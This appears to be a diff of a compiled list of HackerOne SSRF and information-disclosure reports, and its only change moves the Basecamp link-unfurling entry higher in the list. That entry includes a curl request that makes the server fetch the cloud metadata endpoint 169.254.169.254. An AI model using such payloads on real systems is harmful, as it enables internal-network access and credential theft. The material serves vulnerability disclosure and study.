@@ -1297,6 +1297,13 @@ RUBY
 nohup ruby /tmp/vuln_server_nat64.rb >/tmp/vuln_server_nat64.log 2>&1 &'
 ```
 
+## #3445890 Link unfurling calls out to arbitrary URLs and the private-network guard misses link-local addresses — basecamp — - — Server-Side Request Forgery (SSRF)
+Source: `hackerone/reports/2025/3445890.md` (https://hackerone.com/reports/3445890)
+
+```
+curl -X POST https://<host>/unfurl_link -H "Cookie: session_token=..." -H "X-CSRF-Token: <token>" -d 'url=http://169.254.169.254/latest/meta-data/'
+```
+
 ## #237381 SSRF and local file disclosure in https://wordpress.com/media/videos/ via FFmpeg HLS processing — automattic — - — Information Disclosure
 Source: `hackerone/reports/2017/237381.md` (https://hackerone.com/reports/237381)
 
@@ -1311,13 +1318,6 @@ Debian GNU/Linux 8 \n \l
 
 ```
 tc1.videos.dca.wordpress.com
-```
-
-## #3445890 Link unfurling calls out to arbitrary URLs and the private-network guard misses link-local addresses — basecamp — - — Server-Side Request Forgery (SSRF)
-Source: `hackerone/reports/2025/3445890.md` (https://hackerone.com/reports/3445890)
-
-```
-curl -X POST https://<host>/unfurl_link -H "Cookie: session_token=..." -H "X-CSRF-Token: <token>" -d 'url=http://169.254.169.254/latest/meta-data/'
 ```
 
 ## #1092230 FogBugz import attachment full SSRF requiring vulnerability in *.fogbugz.com — gitlab — - — Server-Side Request Forgery (SSRF)
